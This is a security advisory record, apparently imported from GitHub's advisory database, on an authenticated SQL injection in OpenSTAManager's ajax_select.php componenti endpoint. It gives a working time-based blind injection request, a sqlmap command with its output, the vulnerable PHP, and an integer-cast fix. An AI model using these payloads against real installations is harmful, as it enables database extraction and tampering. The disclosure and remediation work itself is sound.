@@ -1,0 +1,119 @@
+advisory_id: GHSA-qjv8-63xq-gq8m
+datasource_id: github_osv_importer_v2/GHSA-qjv8-63xq-gq8m
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-qjv8-63xq-gq8m/GHSA-qjv8-63xq-gq8m.json
+aliases:
+  - CVE-2025-69214
+summary: |
+  OpenSTAManager has a SQL Injection in ajax_select.php (componenti endpoint)
+  ## Summary
+  A SQL Injection vulnerability exists in the `ajax_select.php` endpoint when handling the `componenti` operation. An authenticated attacker can inject malicious SQL code through the `options[matricola]` parameter.
+
+  ## Proof of Concept
+
+  ### Vulnerable Code
+  **File:** `modules/impianti/ajax/select.php:122-124`
+
+  ```php
+  case 'componenti':
+      $impianti = $superselect['matricola'];
+      if (!empty($impianti)) {
+          $where[] = '`my_componenti`.`id_impianto` IN ('.$impianti.')';
+      }
+  ```
+
+  ### Data Flow
+  1. **Source:** `$_GET['options']['matricola']` → `$superselect['matricola']`
+  2. **Vulnerable:** User input concatenated directly into `IN()` clause without sanitization
+  3. **Sink:** Query executed via AJAX framework
+
+  ### Exploit
+
+  **Manual PoC (Time-based Blind SQLi):**
+  ```http
+  GET /ajax_select.php?op=componenti&options[matricola]=1) AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND (1 HTTP/1.1
+  Host: localhost:8081
+  Cookie: PHPSESSID=<valid-session>
+  ```
+  <img width="1306" height="581" alt="image" src="https://github.com/user-attachments/assets/238015dd-5644-4eed-ae8f-864dc0073011" />
+
+  **SQLMap Exploitation:**
+  ```bash
+  sqlmap -u 'http://localhost:8081/ajax_select.php?op=componenti&options[matricola]=1*' \
+    --cookie="PHPSESSID=<session>" \
+    --dbms=MySQL \
+    --technique=T \
+    --level=3 \
+    --risk=3
+  ```
+
+  **SQLMap Output:**
+  ```
+  [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+  Parameter: #1* (URI)
+      Type: time-based blind
+      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+      Payload: options[matricola]=1) AND (SELECT 7438 FROM (SELECT(SLEEP(5)))grko)-- SvRI
+  back-end DBMS: MySQL >= 5.0.12
+  ```
+  <img width="1228" height="801" alt="image" src="https://github.com/user-attachments/assets/b0b7078b-09a7-4e53-956c-baf1d09ed59b" />
+
+  ## Impact
+  - **Data Exfiltration:** Time-based blind SQL Injection allows complete database extraction
+  - **Authentication Bypass:** Access to sensitive component and equipment data
+  - **Data Manipulation:** Potential unauthorized modification of records
+
+  ## Remediation
+
+  Cast values to integers before using in SQL:
+
+  **Before:**
+  ```php
+  $impianti = $superselect['matricola'];
+  if (!empty($impianti)) {
+      $where[] = '`my_componenti`.`id_impianto` IN ('.$impianti.')';
+  }
+  ```
+
+  **After:**
+  ```php
+  $impianti = $superselect['matricola'];
+  if (!empty($impianti)) {
+      $ids = array_map('intval', explode(',', $impianti));
+      $where[] = '`my_componenti`.`id_impianto` IN ('.implode(',', $ids).')';
+  }
+  ```
+
+  ## Credit
+  Discovered by: Łukasz Rybak
+impacted_packages:
+  - purl: pkg:composer/devcode-it/openstamanager
+    affected_versions: vers:composer/<=2.9.8
+    fixed_versions:
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-qjv8-63xq-gq8m/GHSA-qjv8-63xq-gq8m.json
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-qjv8-63xq-gq8m/GHSA-qjv8-63xq-gq8m.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-89
+references:
+  - url: https://github.com/devcode-it/openstamanager
+    reference_type:
+    reference_id:
+  - url: https://github.com/devcode-it/openstamanager/security/advisories/GHSA-qjv8-63xq-gq8m
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-69214
+    reference_type:
+    reference_id:
